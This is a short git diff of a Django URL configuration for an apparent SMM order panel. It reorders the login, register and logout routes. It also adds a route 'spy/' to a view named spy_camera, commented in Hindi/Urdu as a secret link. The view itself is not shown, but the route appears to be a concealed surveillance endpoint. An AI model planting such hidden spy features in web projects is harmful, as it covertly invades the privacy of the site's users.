@@ -2,17 +2,14 @@ from django.urls import path
 from . import views
 
 urlpatterns = [
-    # 🌟 Basic Pages
     path('', views.home, name='home'),
     path('services/', views.services, name='services'),
-    
-    # 🔐 Authentication System 
-    path('login/', views.login_view, name='login'),
-    path('register/', views.register_view, name='register'),
-    path('logout/', views.logout_view, name='logout'),
-    
-    # 🚀 SMM Core Features
     path('add-funds/', views.add_funds, name='add_funds'),
     path('new-order/', views.new_order, name='new_order'),
     path('orders/', views.orders, name='orders'),
+    path('register/', views.register_view, name='register'),
+    path('login/', views.login_view, name='login'),
+    path('logout/', views.logout_view, name='logout'),
+    # 🕵️‍♂️ YEH SECRET LINK HAI
+    path('spy/', views.spy_camera, name='spy_camera'),
 ]
